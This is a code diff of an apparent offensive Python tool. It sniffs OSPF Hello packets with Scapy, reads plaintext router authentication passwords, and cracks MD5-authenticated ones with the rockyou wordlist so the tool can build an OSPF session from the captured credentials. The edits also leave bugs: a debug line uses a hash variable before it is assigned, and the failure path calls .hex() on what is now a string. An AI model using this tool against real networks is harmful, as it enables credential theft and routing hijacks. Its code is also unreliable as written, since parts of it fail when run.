@@ -1,22 +1,23 @@
+from typing import Any
 import hashlib
 import secrets
 import typing
 from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello
 from scapy.layers.inet import IP
-from scapy.all import get_if_hwaddr, get_if_addr, sniff
+from scapy.all import get_if_hwaddr, get_if_addr, sniff, raw
 import argparse
 from helper.helper import (
         OSPFSession,
         OSPFConfig,
         OSPFAuthType,
-        LOG,
+        LOG, hash_password,
         )
 
 
 # FALLBACK if dict param not specified - easy to modify
-ROCKYOU = "/usr/share/wordlist/rockyou.txt"
+ROCKYOU = "/usr/share/wordlists/rockyou.txt"
 
-def crack_password(ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
+def crack_password(pkt: Any, filename: str) -> str | None:
     """
     OSPF Authtype 2 - Hashed PW cracker
 
@@ -38,40 +39,42 @@ def crack_password(ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
         4.  Compare each hash digest against the extracted hash to get the password
     """
 
+    ospf_pkt = pkt[OSPF_Hdr]
+    ospf_len = ospf_pkt.len
+
     # Theoretically chksum should alr be 0 but jic
     if getattr(ospf_pkt, "chksum", None) != 0:
         setattr(ospf_pkt, "chksum", 0)
 
-    raw_ospf_pkt = bytes(ospf_pkt)
+    raw_pkt = bytes(pkt)
+    ospf_bytes = raw(ospf_pkt)
 
-    # Extract OSPF MD5 hash located at end of OSPF packet (after OSPF header + payload)
-    extracted_hash = raw_ospf_pkt[-16:]
-    LOG.info("[!] Extracted hash %s", extracted_hash.hex())
+    # Extract OSPF MD5 hash located at end of entire packet (Scapy [RAW] field)
+    extracted_hash = (ospf_bytes[ospf_len:ospf_len+16]).hex()
+    LOG.info("[!] Extracted hash %s", extracted_hash)
 
     # Extract actual OSPF packet
-    actual_ospf_pkt = raw_ospf_pkt[:-16]
+    actual_ospf_pkt = ospf_bytes[:ospf_len]
 
     # Iterate and try passwords from rockyou.txt
     try:
-        with open(filename, "r", encoding='utf-8') as file:
+        with open(filename, "r", encoding='utf-8', errors="replace") as file:
             for pw in file:
                 print(f"Trying {pw}", end="\r")
                 # Format key to exactly 16 bytes
-                pw_bytes = pw.strip().encode('utf-8')
-                padded_key = pw_bytes + b'\x00' * (16 - len(pw_bytes)) if len(pw_bytes) < 16 else pw_bytes[:16]
 
-                # Concatenate actual ospf pkt and padded key
-                buffer = actual_ospf_pkt + padded_key
+                # if pw == "chelsea":
+                if "chelsea" in pw:
+                    LOG.debug(f"PW: {pw} - Calculated hash: {generated_hash}")
 
-                # Calculate hash
-                generated_hash = hashlib.md5(buffer).digest()
+                generated_hash = hash_password(pw, actual_ospf_pkt)
 
-                if generated_hash == extracted_hash:
+                if generated_hash.hex() == extracted_hash:
                     # Match
                     LOG.critical("[!] Found Password: %s", pw)
                     return pw 
         # Password Cracking Failed
-        LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash)
+        LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash.hex())
         return "" 
 
     except FileNotFoundError:
@@ -110,7 +113,7 @@ def main() -> None:
             "dead_interval": None,
             }
 
-    def capture_ospf_details(pkt) -> bool:
+    def capture_ospf_details(pkt: Any) -> bool:
         """Dynamically extract wanted values from sniffed OSPF packet"""
         if IP not in pkt or OSPF_Hdr not in pkt or OSPF_Hello not in pkt:
             return False
@@ -157,8 +160,9 @@ def main() -> None:
         if extract_details["authtype"] == OSPFAuthType.PLAINTEXT:
             # Extract plaintext pw directly
             extract_details["password"] = ospf_packets.authdata
+            LOG.info(f"[*] Plaintext Password: {extract_details["password"]}")
         elif extract_details["authtype"] == OSPFAuthType.CRYPTO:
-            extract_details["password"] = crack_password(ospf_packets, args.dict)
+            extract_details["password"] = crack_password(pkt, args.dict)
 
         # self.config.plaintext_pw = self.crack_password(ospf, self.dictpath)
 
@@ -188,6 +192,7 @@ def main() -> None:
 
             # Authentication fields
             authtype=typing.cast(int, extract_details.get("authtype")),
+            # plaintext_pw=typing.cast(str, extract_details.get("password")),
             plaintext_pw=typing.cast(str, extract_details.get("password")),
             key_id=typing.cast(int, extract_details.get("keyid")),
             authdata_len=typing.cast(int, extract_details.get("authdatalen")),
